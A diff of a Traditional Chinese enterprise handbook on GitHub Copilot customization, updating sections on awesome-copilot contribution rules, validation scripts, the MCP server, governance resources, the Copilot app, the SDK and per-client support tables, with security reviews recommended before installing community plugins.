 - **網站瀏覽**：依五大分類（Agents/Instructions/Skills/Plugins/Canvas Extensions）加上 Learning Hub 瀏覽，每項資源提供「Copy Install」按鈕。
-- **CLI Marketplace**：GitHub Copilot CLI 具備 Plugin Marketplace 機制，awesome-copilot 本身就註冊為一個 Marketplace 來源，可用 `copilot plugin marketplace add github/awesome-copilot` 註冊後安裝其中的 Plugin（詳見第 12 章）。
+- **CLI Marketplace**：GitHub Copilot CLI 具備 Plugin Marketplace 機制，awesome-copilot **已是官方預設註冊的來源之一**（另一個是 `copilot-plugins`），新版 CLI 可直接 `copilot plugin install <name>@awesome-copilot`，舊版才需先 `copilot plugin marketplace add github/awesome-copilot`（詳見第 12 章）。
+- **awesome-copilot MCP Server**：Repository 自帶一台 MCP Server，讓 Agent 能直接從庫內搜尋與安裝資源，**執行需要 Docker**（詳見第 2.8 節）。
+- **`docs/README.*.md`**：CI 自動產生的完整資源索引（Agents／Instructions／Skills／Plugins／Hooks／Workflows 各一份），適合離線盤點或實作企業 Catalog 時參考。
 - **llms.txt**：供 AI Agent／LLM 工具直接讀取索引，快速了解倉庫內容結構，不需要人工爬取整個 Repository。
 
 ### 2.5 社群貢獻模式
 
-依官方 `CONTRIBUTING.md`（Source-confirmed），每種資源類型都有固定的提交格式與（部分類型提供的）鷹架指令：
+依官方 `CONTRIBUTING.md` 與 `AGENTS.md`（Source-confirmed，2026-08-28 複查），每種資源類型都有固定的提交格式與（部分類型提供的）鷹架指令：
 
-| 資源類型 | 路徑慣例 | 檔名慣例 | 必要 Frontmatter／檔案 | 鷹架指令 |
-|---|---|---|---|---|
-| Instructions | `instructions/` | `*.instructions.md`（小寫連字號） | `description` | — |
-| Agents | `agents/` | `*.agent.md` | `description`、`model`、`tools`、`name` | — |
-| Skills | `skills/<name>/` | 資料夾 | `SKILL.md`（`name` 需與資料夾同名），單一 asset < 5MB | `npm run skill:create` |
-| Plugins | `plugins/<name>/` | 資料夾 | `plugin.json`（`name`／`description`／`version` 必填） + `README.md` | `npm run plugin:create` |
-| Hooks | `hooks/<name>/` | 資料夾 | `README.md`（frontmatter：`name`／`description`／`tags`） + `hooks.json` | — |
-| Agentic Workflows | `workflows/` | `*.md` | `name`／`description`／`on`／`permissions`／`safe-outputs`；只收 `.md`，不可提交 `.lock.yml` | `gh aw compile` |
+| 資源類型 | 路徑慣例 | 檔名慣例 | 必要 Frontmatter／檔案 | 鷹架／驗證指令 | 貢獻類型標記 |
+|---|---|---|---|---|---|
+| Instructions | `instructions/` | `*.instructions.md`（小寫連字號） | `description`（須以**單引號**包住）**與 `applyTo`（兩者皆必填）** | — | 🧭 |
+| Agents | `agents/` | `*.agent.md` | `description`（單引號）必填；`name` 須為**人類可讀名稱**（如 `Address Comments`，非 `address-comments`）；`model` 強烈建議、`tools` 建議 | — | 🎭 |
+| Skills | `skills/<name>/` | 資料夾 | `SKILL.md`；`name` 須與資料夾同名、小寫連字號、**≤ 64 字**；`description` 單引號、**10–1024 字**；單一 asset < 5MB | `npm run skill:create -- --name <n>`／`npm run skill:validate` | 🧰 |
+| Plugins | `plugins/<name>/` | 資料夾 | `plugin.json`（`$schema`／`name`／`description`／`version` 必填） + `README.md`；內容以宣告式 `extensions` 組合（見 11.3） | `npm run plugin:create -- --name <n>`／`npm run plugin:validate` | 🎁 |
+| Hooks | `hooks/<name>/` | 資料夾 | `README.md`（frontmatter：`name`／`description`／`tags`） + `hooks.json`（格式與官方 `.github/hooks/NAME.json` 相同，見 13.4） | — | — |
+| Agentic Workflows | `workflows/` | `*.md` | `name`／`description`／`on`／`permissions`／`safe-outputs`；**只收 `.md`**，`.yml`／`.yaml`／`.lock.yml` 會被 CI 擋下 | `gh aw compile` | ⚡ |
+| Canvas Extensions | `extensions/<id>/` + `plugins/<id>/` | `extension.mjs` + `plugin.json` | `extensions.com.github.copilot.logo` 必須正好是 `"assets/preview.png"`；**不可**新增 `canvas.json` | `npm run plugin:validate` | — |
+
+**貢獻流程上容易踩到的坑（Source-confirmed）**：
+
+- PR **必須針對 `main` 分支**；從 `staged` 分支開出的 PR 可能直接被退回。
+- 提交前必須執行 `bash eng/fix-line-endings.sh` 將 CRLF 轉為 LF（Windows 開發者特別容易失跟）。
+- 修改資源後需執行 `npm ci` → `npm run build`（或 `npm start`）重新產生 README 與 `docs/` 索引，否則 CI 會失敗。
+- **若是 AI Agent 代為提交的 PR，標題需附上 `🤖🤖🤖`** 以走快速合併通道——這是目前少數明文規定「AI 產出須自我揭露」的實際例子，企業制定內部 PR 規範時可直接參考這個做法。
+- `marketplace.json` 由 `npm run plugin:generate-marketplace` 自動產生於 `.github/plugin/marketplace.json`，**不可手改**。
+
+**awesome-copilot 明文拒收的內容（"What We Don't Accept"，Source-confirmed）**：違反 Responsible AI 原則、繞過安全控制、協助恶意行為、利用模型弱點、產生有害內容、規避政策限制、只是重述模型本來就很強的能力而無實際加值、以及未經審查的遠端來源 Plugin。這份清單可直接改寫為企業自己的「AI 客製化資源受理標準」（對應第 20 章 Governance）。
 
 ### 2.6 如何挑選第三方 Agent／Skill／Plugin
 
@@ -294,7 +514,69 @@ awesome-copilot 收錄的每一份 Agent、Skill、Instructions、Plugin、Hook�
 
 > **安裝任何 Agent、Skill、Plugin、Hook 或 MCP Server 前，都必須先閱讀其內容、依賴、權限與執行行為。**
 >
-> awesome-copilot 是社群貢獻的資源集合，PR review 無法保證每一份資源都無害。Hooks 與 Plugins 尤其risky，因為它們可以執行 Shell 指令；Skills 若綁定 `allowed-tools` 不當，也可能讓 Copilot 取得超出預期的工具存取權。詳見第 20-21 章的 Governance 與安全評估流程。
+> awesome-copilot 是社群貢獻的資源集合，PR review 無法保證每一份資源都無害。Hooks 與 Plugins 尤其高風險，因為它們可以執行 Shell 指令；Skills 若綁定 `allowed-tools` 不當，也可能讓 Copilot 取得超出預期的工具存取權。詳見第 20-21 章的 Governance 與安全評估流程。
+
+### 2.8 `docs/`、`eng/` 與 awesome-copilot MCP Server
+
+這三項是大多數介紹文漏掉、但對企業自建相同機制最有參考價值的部分（Source-confirmed，2026-08-28 Contents API 與 `AGENTS.md` 複查）。
+
+#### 產生式資源索引：`docs/README.*.md`
+
+| 檔案 | 內容 | 規模參考 |
+|---|---|---|
+| `docs/README.agents.md` | 全部 Agent 的總表 | 約 230 KB |
+| `docs/README.skills.md` | 全部 Skill 的總表 | 約 220 KB |
+| `docs/README.instructions.md` | 全部 Instructions 的總表 | 約 186 KB |
+| `docs/README.plugins.md` | 全部 Plugin（含外部 Plugin）總表 | 約 35 KB |
+| `docs/README.hooks.md` | Hooks 說明與清單 | 約 3.4 KB |
+| `docs/README.workflows.md` | Agentic Workflows 說明與清單 | 約 3.4 KB |
+
+這些檔案**全部由 `npm run build` 自動產生，不可手改**。對企業的啟示：第 24 章的企業 Catalog **不應該手工維護**——應該把各資源的 frontmatter 當成唯一真相來源，由 CI 產生 Catalog，否則目錄與實際資源必然會隨時間脱節（這也是第 28 章維護策略的實作重點）。
+
+#### 驗證與建置腳本：`eng/`
+
+| 指令 | 用途 |
+|---|---|
+| `npm ci` | 安裝相依（鎖定版本） |
+| `npm run build`／`npm start` | 重新產生 README 與 `docs/` 索引 |
+| `npm run plugin:validate` | 驗證全部 `plugin.json`（含 Canvas Extensions） |
+| `npm run plugin:generate-marketplace` | 產生 `.github/plugin/marketplace.json` |
+| `npm run plugin:create -- --name <n>` | 建立新 Plugin 鷹架 |
+| `npm run skill:validate`／`npm run skill:create -- --name <n>` | 驗證／建立 Skill |
+| `bash eng/fix-line-endings.sh` | **提交前必跑**，CRLF → LF |
+| `eng/external-plugin-validation.mjs` | 外部 Plugin 的**正規驗證器**（規則：`marketplace`／`publicSubmission`，見 11.5） |
+
+> ⚠️ **企業對應做法（建議架構）**：把上表的「驗證指令」觀念搬到企業自己的客製化資源倉庫，在 CI 上強制執行 schema 驗證，可以預防大多數「Agent 沒出現」「Skill 沒觸發」類的問題（對應第 27 章 Troubleshooting 的前三項）。
+
+#### awesome-copilot MCP Server
+
+Repository 頂層的 `mcp.json` 定義了一台 **awesome-copilot 專用 MCP Server**，讓 Agent 可以直接從對話中搜尋並安裝庫內資源，而不需要人工到網站複製貼上。
+
+- **前提條件：本機需安裝並啟動 Docker**（這是企業內部隱形的導入門檳：若開發者筆電禁止安裝容器執行環境，此路徑直接不可用）。
+- 使用前仍須依第 21 章 Checklist 審查：它能「直接安裝資源」這件事本身就是一個需要治理的能力，不應該在未建立 Approved Catalog 前就對全團隊開放。
+- 定位上它屬於第 3 章五層模型的「連接層（MCP）」，但服務的對象是「客製化資源本身」，而非一般的外部業務系統。
+
+### 2.9 awesome-copilot 的 AI 供應鏈與 Agent 治理資源盤點
+
+2026-08-28 複查 `llms.txt` 索引時發現，awesome-copilot 近一年新增了一整批**「治理 AI 本身」**的資源。這批資源與第 20-21 章（Governance、Security Review）高度相關，卻最容易被忽略——多數團隊只會搜尋「Java」「Vue」這類技術關鍵字，不會主動搜尋「governance」。以下為盤點結果（Source-confirmed，取自官網 `llms.txt` 的 Agents／Skills 清單）：
+
+| 資源名稱 | 類型 | 官方描述重點（原文摘要） | 對應本手冊章節 |
+|---|---|---|---|
+| `trojan-skill-hunter` | Agent | 在 Agent／Skill／Instructions／Hook／MCP 設定**被合併、安裝或信任之前**，稽核其中是否藏有 prompt injection、tool poisoning、Unicode 隱寫、過度授權（excessive agency）；對應 OWASP Top 10 for LLM Applications 與真實 MCP 攻擊研究 | 第 21 章安全評估 |
+| `agent-governance-reviewer` | Agent | 審查程式碼中缺少的治理控制，協助導入政策強制、信任評分、稽核軌跡 | 第 20 章 Governance |
+| `doublecheck` | Agent | 三層驗證管線（自我稽核 → 來源查證 → 對抗式審查），產出附來源連結的結構化報告供人工複核 | 第 31 章 Quality Gate |
+| `agent-owasp-compliance` | Skill | 依 **OWASP Agentic Security Initiative（ASI）Top 10** 檢查 Agent 系統，產出合規報告 | 第 20.2 節十類安全風險 |
+| `agent-supply-chain` | Skill | 產生 SHA-256 完整性 manifest、驗證已安裝 Plugin 是否與發布版本一致、偵測被竄改或未追蹤的檔案、建立 dev → staging → production 的來源鏈 | 第 11.5 節 SHA 鎖定、第 21 章 |
+| `agent-governance` | Skill | 為 Agent 系統加上政策式存取控制、語意意圖分類、信任評分、稽核軌跡、速率限制 | 第 20 章 |
+| `security-review` | Skill | 以資安研究員視角追蹤資料流與元件互動的程式碼掃描 | 第 8.10 節（本手冊自建版）可對照 |
+| `secret-scanning`、`dependabot`、`codeql` | Skill | GitHub Advanced Security 三大能力的設定與維運指引；兩者皆指向 **Advanced Security plugin（`advanced-security@copilot-plugins`）** 供 Agent 在 commit 前掃描 | 第 13 章 Hooks、第 21 章 |
+| `threat-model-analyst`、`tm7-threat-model` | Skill | STRIDE-A 威脅模型分析（含增量比對）／產生 Microsoft Threat Modeling Tool `.tm7` 檔 | 第 21 章 |
+| `verify-agent-action` | Skill | 在 Agent 執行高風險動作（部署、金鑰操作、資料變更）**之前**，審查核准封包是否與實際動作相符，偵測參數置換、重放、偽造證據 | 第 19.2 節防護措施 |
+| `suggest-awesome-github-copilot-agents`／`-instructions`／`-skills` | Skill | 依當前 Repository 情境推薦 awesome-copilot 資源，**並標示已過期、需更新的既有資源** | 第 28 章維護策略 |
+
+> ⚠️ **企業實務建議（建議架構）**：把 `trojan-skill-hunter` 與 `agent-supply-chain` 的「檢查面向」抄進企業自己的第 21 章 Checklist，但**不要直接安裝這兩個社群 Agent／Skill 就當成安全防線**——用一個未經審查的社群資源去審查其他未經審查的社群資源，邏輯上是循環的。正確做法是：人工閱讀它們的 `SKILL.md`／`.agent.md` 內容，萃取檢查項目，改寫成企業自建、經過 CODEOWNERS 保護的版本。
+
+另外值得注意的是 **Advanced Security plugin（`advanced-security@copilot-plugins`）**：它由 `copilot-plugins` 這個 GitHub 官方預設 Marketplace 提供，讓 Agent 在 commit 前透過 GitHub MCP Server 掃描 Secret 與相依套件弱點。對已購買 GitHub Advanced Security 的企業而言，這是**優先於任何社群資源**的選項（官方已實作）。
 
 ### Scenario
 
@@ -305,6 +587,9 @@ awesome-copilot 收錄的每一份 Agent、Skill、Instructions、Plugin、Hook�
 - [ ] 已理解 awesome-copilot 是「社群精選集」而非「官方規格文件」
 - [ ] 已知道現行五大資源類型與各自路徑慣例
 - [ ] 已知道 `chatmodes/`／`prompts/`／`collections/` 是已移除的舊結構
+- [ ] 已知道 `docs/README.*.md` 是 CI 產生的索引，並已評估企業 Catalog 是否要改為自動產生（第 2.8 節）
+- [ ] 已評估 awesome-copilot MCP Server 是否符合企業的 Docker 使用政策
+- [ ] 已依第 2.9 節盤點「治理類資源」，並確認企業是否已有 Advanced Security plugin 可用
 - [ ] 安裝任何資源前，已建立「先讀內容、後安裝」的團隊習慣
 
 ---
@@ -422,10 +707,10 @@ graph TB
 | **Skills** | 可重複調用的能力封裝，含 `SKILL.md` 與可選的腳本/範本/參考資料 | 一套需要多步驟、可能需要 bundled 資源的專業能力（例如逆向工程分析流程） | Framework Migration 分析、Reverse Engineering、複雜的多步驟工作流程 | 單純的靜態規則（改用 Instructions） | `.github/skills/<name>/` | 第 8 章 |
 | **Hooks** | 在 Agent 生命週期事件點自動執行的 Shell 指令（`.github/hooks/*.json`） | 需要「確定性」而非「AI 判斷」的自動化，例如強制跑測試、掃描 Secret | Pre-commit 檢查、Session 開始/結束的環境準備 | 需要 AI 判斷邏輯的情況（改用 Agent／Skill） | `.github/hooks/` | 第 13 章 |
 | **Workflows（Agentic）** | 透過 `gh-aw` 擴充套件編譯、跑在 GitHub Actions 上的 Agent 工作流程 | 需要在 CI/CD 環境中跑自主 Agent 任務（例如自動巡檢 Issue） | 排程性、事件驅動的 Repository 自動化 | 需要即時互動的情境 | `.github/workflows/`（原始 `.md` 定義） | 本節 4.2 |
-| **Plugins** | 打包一組 Agents／Skills／Hooks／MCP 設定成單一可安裝單位（`plugin.json`） | 需要把一整套能力「一次分發」給團隊或組織 | Enterprise Toolkit、跨專案共用的標準能力組 | 只有單一資源要分享時（直接分享該資源即可） | `plugins/<name>/` | 第 11-12 章 |
+| **Plugins** | 打包一組 Agents／Skills／Hooks／MCP／LSP 設定成單一可安裝單位（`plugin.json`） | 需要把一整套能力「一次分發」給團隊或組織 | Enterprise Toolkit、跨專案共用的標準能力組 | 只有單一資源要分享時（直接分享該資源即可）；**Instructions 不能被打包進 Plugin** | `plugins/<name>/` | 第 11-12 章 |
 | **MCP Servers** | Agent 與外部工具/資料/系統的連接層 | 需要查詢資料庫、Jira、GitHub、內部系統等外部資源 | 需要 Live Data 或執行外部動作 | 純粹的靜態規則或程式碼生成 | `.vscode/mcp.json`、`~/.copilot/mcp-config.json` | 第 14 章 |
 | **Cookbook** | Copy-paste-ready 的 Copilot SDK／API 範例 | 需要用程式碼直接呼叫 Copilot API/SDK 建立自己的整合 | 開發內部工具、CI 腳本呼叫 Copilot | 一般日常開發（不需要寫程式呼叫 API） | `cookbook/` | 本節 4.3 |
-| **Canvas Extensions** | Copilot App 互動式擴充體驗 | 需要在 Copilot App 中提供互動式 UI 體驗 | 官方文件頁面未找到獨立說明（官方目前沒有找到足夠資料確認此功能），暫歸類為 Plugin 生態一部分 | — | `extensions/` | 本節 4.4 |
+| **Canvas Extensions** | Copilot app 的互動式擴充體驗（`extension.mjs` + 成對的 `plugin.json`） | 需要在 Copilot app 中提供互動式 UI（視覺化規劃、儀表板等） | 規劃型、需要图形介面而非純文字對話的任務 | 命令列或 CI 情境（無 UI 宿主） | `extensions/` + `plugins/` | 本節 4.4 |
 | **Learning Hub** | awesome-copilot 官網的教學文章區 | 需要系統性學習 Copilot／awesome-copilot 用法 | 新人 Onboarding、專題式學習 | — | 官網導覽列 | 第 2.3 節 |
 | **llms.txt** | Machine-readable 索引檔，供 LLM/Agent 快速理解倉庫內容 | Agent 需要「不爬取整個 repo」就能理解資源清單 | 建立自己的 Agent 去查詢 awesome-copilot 內容時 | 人類閱讀（人類直接看官網或 README 更直觀） | `https://awesome-copilot.github.com/llms.txt` | 第 2.3 節 |
 | **Marketplace** | Copilot CLI 的 Plugin 來源註冊機制 | 需要從特定來源（如 awesome-copilot）安裝 Plugin | 導入 Plugin 生態系 | 不使用 Plugin 機制時不需要 | `copilot plugin marketplace add <org>/<repo>` | 第 12 章 |
@@ -460,7 +745,7 @@ git commit -m "feat: add agentic workflow"
 
 ### 4.4 Canvas Extensions 補充說明
 
-> ⚠️ 查證時**未找到** `docs.github.com` 上針對 Canvas Extensions 的獨立官方文件頁，僅在 awesome-copilot 官網與 Agent Plugins 1.0 Changelog 中以 "extensions like canvases" 的方式被提及。但 awesome-copilot 自己的 `CONTRIBUTING.md`（Source-confirmed，2026-08-27 查證）**確實**定義了明確的目錄結構規範，並非完全無資料可查：
+> ⚠️ 查證時仍**未找到** `docs.github.com` 上針對 Canvas Extensions 的獨立官方文件頁；但 2026-08-28 複查發現，**awesome-copilot 官網 Learning Hub 已有專文「Working with Canvas Extensions」**，且 `CONTRIBUTING.md`（Source-confirmed）定義了明確的目錄與驗證規範，資料完整度已比上一版提升。
 
 ```text
 extensions/<extension-id>/
@@ -470,7 +755,43 @@ plugins/<extension-id>/  # 需與 extensions/ 下同名，成對存在
 └── plugin.json          # 對應的 Plugin manifest，name 需與資料夾同名
 ```
 
-驗證方式與其他 Plugin 相同，執行 `npm run plugin:validate`。企業導入時應將其視為「Plugin 生態的延伸能力、有 Repository 內部貢獻規範可循，但缺乏 `docs.github.com` 獨立說明頁」的狀態，安裝前比照 Plugin 的安全審查流程處理，並持續關注官方文件是否補齊獨立頁面。
+**實作時最容易失敗的三個點（Source-confirmed，取自 `CONTRIBUTING.md`）**：
+
+1. `plugin.json` 中的 `extensions.com.github.copilot.logo` **必須恰好是 `"assets/preview.png"`**，不可改成其他路徑或檔名。
+2. **不可新增 `canvas.json`**——此檔不屬於現行規格，加了反而會驗證失敗。
+3. 一定要執行 `npm run plugin:validate` 驗證，不可僅靠目測。
+
+建立方式上，Learning Hub 說明可在 Copilot app 中以 `/create-canvas` slash command 產生並逐步演進 Canvas，不必從空白手寫 `extension.mjs`。
+
+企業導入時應將其視為「Plugin 生態的延伸能力、有 Repository 內部貢獻規範與 Learning Hub 教材可循，但仍缺乏 `docs.github.com` 獨立說明頁」的狀態，安裝前比照 Plugin 的安全審查流程處理（第 21 章），並持續關注官方文件是否補齊獨立頁面。
+
+### 4.5 GitHub Copilot app 與 Automations（新增）
+
+2026-08-28 複查時，awesome-copilot Learning Hub 的 Getting Started 區已以 **GitHub Copilot app** 為首選入口，這是上一版手冊尚未涵蓋的重要變化（Source-confirmed）。
+
+| 項目 | 說明 | 對企業的意義 |
+|---|---|---|
+| GitHub Copilot app | 桌面程式，定位為「平行指揮多個 Agent 的控制中心」，使用**隔離的 worktree** 避免多 Agent 互相覆寫 | 對應第 10 章 Agent Team 協作；隔離 worktree 是目前最接近「多 Agent 安全並行」的官方解法 |
+| Automations | Copilot app 內的自動化範本機制，有官方範本與實例 | 與第 13 章 Hooks、第 4.2 節 Agentic Workflows 同屬「自動化層」，導入前須釐清三者職責以免重疊 |
+| Agent Merge | Copilot app 的合併輔助能力（Learning Hub Workshop Lesson 6） | 多 Agent 平行作業後的整合關卡 |
+| Autopilot | Copilot app 的自主實作模式（Workshop Lesson 4） | 風險較高，須搭配第 31 章 Quality Gate 使用 |
+| Plugin 安裝介面 | 在 app 中點選 **Customize → Plugins** 瀏覽 Marketplace 並安裝 | 與 CLI／VS Code 的安裝路徑不同，企業治理須同時涵蓋（見第 20.5 節） |
+
+> ⚠️ **治理提醒**：Copilot app 是一個獨立的使用介面，它的 Plugin 安裝行為不會因為企業在 VS Code 做了限制而自動受控。若企業已導入 Copilot app，必須依第 20.5 節的 `managed-settings.json` 做跨介面的集中管控，而不是只靠 Repository 層級的設定。
+
+### 4.6 Copilot SDK 與 Agent Host
+
+上一版手冊將 `cookbook/` 僅描述為「Copilot SDK 的程式化範例」；2026-08-28 複查發現 **Copilot SDK 已不只是一個選配的周邊套件，而是 Copilot 本身的執行底層**：VS Code 官方文件明載「Copilot harness 使用 Copilot SDK 並跑在 Agent Host 上」（官方已實作）。這對企業有三個實際意義：
+
+| 面向 | 說明 | 企業對應動作 |
+|---|---|---|
+| **執行底層** | Copilot harness 的 Agent 迴圈由 Copilot SDK 驅動，跑在獨立於 UI 視窗的 Agent Host 程序中 | 重新檢視第 6.3 節的「Agent Host 讀 `~/.copilot/agents`」例外：這不是小細節，而是預設路徑 |
+| **企業自建工具** | 可用 SDK 把 Agent 嵌入自家應用：串流回應、自訂工具、Session 管理、連接 MCP Server、建立 Custom Agent | 適合「內部平台團隊」把第 10 章 Agent Team 包裝成內部服務，而非要求每位工程師手動操作 |
+| **範例來源** | awesome-copilot `cookbook/` 已收錄社群範例，含 **Copilot SDK Java Examples**（Source-confirmed，2026-08 commit 記錄） | 對 Java 為主的企業，這是目前最接近可直接參考的起點 |
+
+另外，awesome-copilot 收錄了 `copilot-sdk` Skill，官方描述為「Build agentic applications with GitHub Copilot SDK」，觸發詞包含 embed Copilot、programmable agent、MCP server、custom agent（Source-confirmed）。
+
+> ⚠️ **評估提醒（建議架構）**：用 SDK 自建工具會把「Agent 行為的控制權」從 IDE 的審核介面移到企業自己的程式碼中。這代表第 20 章的 Governance 控制（工具授權、人工核准關卡、稽核軌跡）**必須在你自己的應用層重新實作一次**，不能假設「VS Code 有的防護，SDK 也有」。導入前請先完成第 21 章的安全評估。
 
 ### Scenario
 
@@ -481,6 +802,7 @@ plugins/<extension-id>/  # 需與 extensions/ 下同名，成對存在
 - [ ] 已對照 4.1 總覽表，確認每種待建立的資源該歸類到哪一種類型
 - [ ] 已知道 Agentic Workflows 只提交 `.md`，不提交 `.lock.yml`
 - [ ] Canvas Extensions 已知悉「官方文件不完整」，安裝前需加強審查
+- [ ] 若規劃以 Copilot SDK 自建工具，已確認 Governance 控制會在自家應用層重新實作（4.6）
 
 ---
 
@@ -614,29 +936,108 @@ project/
 
 | Scope | 位置 | 適用範圍 |
 |---|---|---|
-| Repository（Project） | `.github/copilot-instructions.md`、`.github/instructions/`、`.github/agents/`、`.github/skills/`、`.github/hooks/` | 該 Repository 所有協作者 |
-| Personal | `~/.copilot/copilot-instructions.md`、`~/.copilot/instructions/`、`~/.copilot/agents/`、`~/.copilot/skills/` | 僅該使用者本機，跨所有 Repository 生效 |
-| Organization | GitHub.com 組織設定（Business/Enterprise 方案），無實體檔案 | 該組織所有成員，僅 GitHub.com 端生效 |
+| Repository（Project） | `.github/copilot-instructions.md`、`.github/instructions/`、`.github/agents/`、`.github/skills/`、`.github/hooks/`、`.github/copilot/settings.json` | 該 Repository 所有協作者 |
+| Repository（Claude 格式相容） | `.claude/agents/`、`.claude/skills/`、`.agents/skills/` | VS Code 會一併讀取，方便跨工具共用（見第 33 章） |
+| Personal | `~/.copilot/copilot-instructions.md`、`~/.copilot/instructions/`、`~/.copilot/agents/`、`~/.copilot/skills/`、`~/.copilot/settings.json`；另支援 `~/.claude/skills/`、`~/.agents/skills/` | 僅該使用者本機，跨所有 Repository 生效 |
+| Organization | GitHub.com 組織設定（Business/Enterprise 方案）；VS Code 另有 `github.copilot.chat.organizationCustomAgents.enabled` 可從組織發現共用 Custom Agents | 該組織所有成員 |
+| Enterprise | `managed-settings.json`（企業管理者集中管控，見第 20.5 節） | 企業 Copilot 方案下的所有使用者、跨所有支援的 Client |
 
-### 6.4 Root Level 與 Nested Configuration
+> ⚠️ **Agent Host 的例外**：VS Code 官方文件明載，Agent Host 讀取的是 `~/.copilot/agents`，**而非 VS Code 自己的 profile 資料夾**。若企業把個人層級 Agent 放在 VS Code profile 內，在 Agent Host 情境下會完全讀不到。
+
+### 6.4 Root Level、Nested 與 Monorepo 設定
 
 - `AGENTS.md` 預設只讀取 workspace root；VS Code 提供 `chat.useNestedAgentsMdFiles`（**Experimental**）讓 monorepo 子資料夾也能有各自的 `AGENTS.md`。
 - `*.instructions.md` 透過 frontmatter 的 `applyTo` glob 決定套用範圍，本質上就是一種「巢狀/路徑範圍」機制，不需要額外的巢狀資料夾規則。
+- **Monorepo 父倉庫發現（官方已實作）**：若專案是大 monorepo 底下的子倉庫，開啟 `chat.useCustomizationsInParentRepositories` 可讓 VS Code 從**父倉庫 root** 發現 Instructions／Skills／Agents，避免每個子專案都要複製一份相同的規則。其行為細節如下（2026-08-28 複查 VS Code 官方文件）：
+  - **預設是關閉的**，必須手動開啟。
+  - 開啟後，VS Code 從每個 workspace folder **向上尋找到含 `.git` 的目錄為止**，並收集**沒到的所有層級（含頭含尾）**的客製化。
+  - 生效條件三項同時成立：workspace folder 本身**沒有** `.git`、某個父目錄**有** `.git`、且該父目錄**已被信任**。
+  - 套用範圍涵蓋**所有客製化類型**：always-on instructions（`copilot-instructions.md`、`AGENTS.md`、`CLAUDE.md`）、檔案式 instructions、prompt files、custom agents、agent skills 與 **hooks**。尤其 hooks 會被継承這一點，企業須在第 20 章 Governance 中明確納入風險評估。
+- **自訂存放位置**：`chat.agentFilesLocations`（Agents）與 `chat.agentSkillsLocations`（Skills）可指定額外的專案級資料夾，適合企業已有自訂目錄結構、不想遯就 `.github/` 的情境。
 
 ### 6.5 不同 Copilot Client 的支援差異
 
 > ⚠️ 這是撰寫企業文件時最容易忽略、卻最容易導致「同事在 A 工具測試沒問題，換 B 工具就失效」的一段。務必在團隊內部文件中附上下表，並持續關注官方支援矩陣更新。
 
-| 客製化機制 | VS Code | Copilot CLI | Copilot cloud agent | GitHub.com Code Review | JetBrains／Eclipse／Xcode |
-|---|---|---|---|---|---|
-| `copilot-instructions.md` | ✅ | ✅ | ✅ | ✅ | 依官方支援矩陣，需查證當下最新狀態 |
-| `AGENTS.md` | ✅（可用設定開關） | ✅ | ✅ | ✅（**僅認 `AGENTS.md`**，不認 `CLAUDE.md`/`GEMINI.md`） | ✅（cloud agent 相關情境） |
-| `*.instructions.md` | ✅ | ✅ | ✅ | 資料不足，需查證當下最新狀態 | 資料不足 |
-| Custom Agents（`.agent.md`） | ✅ | ✅ | 資料不足 | 不適用 | 資料不足 |
-| Agent Skills（`SKILL.md`） | ✅（agent mode） | ✅ | ✅ | ✅（官方文件列為支援對象之一） | ✅ |
-| Hooks | 資料不足（VS Code 端另有 agent 層級 hooks，屬 Preview） | ✅ | ✅（須在 default branch） | 不適用 | 資料不足 |
+| 客製化機制 | VS Code | Copilot CLI | Copilot cloud agent | GitHub Copilot app | GitHub.com Code Review | JetBrains／Eclipse／Xcode |
+|---|---|---|---|---|---|---|
+| `copilot-instructions.md` | ✅ | ✅ | ✅ | ✅ | ✅ | 依官方支援矩陣，需查證當下最新狀態 |
+| `AGENTS.md` | ✅（可用設定開關） | ✅ | ✅ | ✅ | ✅（**僅認 `AGENTS.md`**，不認 `CLAUDE.md`/`GEMINI.md`） | ✅（cloud agent 相關情境） |
+| `*.instructions.md` | ✅ | ✅ | ✅ | 資料不足 | 資料不足，需查證當下最新狀態 | 資料不足 |
+| Custom Agents（`.agent.md`） | ✅ | ✅ | 資料不足 | ✅（Learning Hub Workshop 有 app 的 Custom Agents 單元） | 不適用 | 資料不足 |
+| Agent Skills（`SKILL.md`） | ✅（agent mode） | ✅ | ✅ | ✅ | ✅（官方文件列為支援對象之一） | ✅ |
+| Hooks | 資料不足（VS Code 端另有 agent 層級 hooks，屬 Preview，需 `chat.useCustomAgentHooks`） | ✅ | ✅（須在 default branch） | 資料不足 | 不適用 | 資料不足 |
+| Plugins | ✅ | ✅（`copilot plugin install` 或 `enabledPlugins`） | ✅（**僅支援宣告式** `enabledPlugins`，見 12.6） | ✅（Customize → Plugins） | 不適用 | 資料不足 |
+| Canvas Extensions | 不適用 | 不適用 | 不適用 | ✅（`/create-canvas`） | 不適用 | 不適用 |
 
 （本表依查證所得整理，未列出「✅」以外明確狀態的欄位一律標示「資料不足」，代表官方支援矩陣頁面未明確載明，企業導入前應自行至 `docs.github.com/en/copilot/reference/custom-instructions-support` 等頁面重新確認當下版本。）
+
+### 6.6 四種 Harness 的選用與設定檔對照
+
+2026 年中之後，GitHub Copilot 已明確形成**四種 harness（執行宿主）**，awesome-copilot Learning Hub 的 Workshop 也是以這四種 harness 分軌教學（Source-confirmed）。企業制定標準前須先釐清團隊實際使用哪幾種：
+
+| Harness | 典型使用情境 | 主要設定檔 | 治理重點 |
+|---|---|---|---|
+| **VS Code** | 日常互動式開發、Code Review 前的自我檢查 | `.github/**`、VS Code settings（`chat.*`） | 設定分散在 workspace／profile／organization 三處，最容易出現「只有某人有效」 |
+| **Copilot CLI** | 終端機作業、CI 腳本、離線批次任務 | `~/.copilot/settings.json`、`.github/copilot/settings.json` | Plugin 可命令式安裝，需靠 `managed-settings.json` 約束 |
+| **Copilot cloud agent** | 非同步自主任務（跑在 GitHub Actions） | `.github/copilot/settings.json`、**設定須在 default branch** | Hooks 與 Plugin 都只認 default branch，feature branch 上的設定一律無效 |
+| **GitHub Copilot app** | 平行指揮多 Agent、Canvas 規劃、Automations | app 內的 Customize 介面＋個人層設定 | 獨立於 IDE 之外的安裝路徑，**最容易逃過企業治理** |
+
+> ⚠️ **企業實務建議（建議架構）**：請在企業內部標準中明列「本公司支援哪幾種 harness」，並針對每種 harness 列出對應的設定檔與檢查方式。實務上最常見的治理破口就是「IDE 管得很嚴，但開發者自行安裝 Copilot app 後自己裝 Plugin」，這只能靠第 20.5 節的企業級設定解決。
+
+### 6.7 Session Target、Agent Harness 與 Code Isolation
+
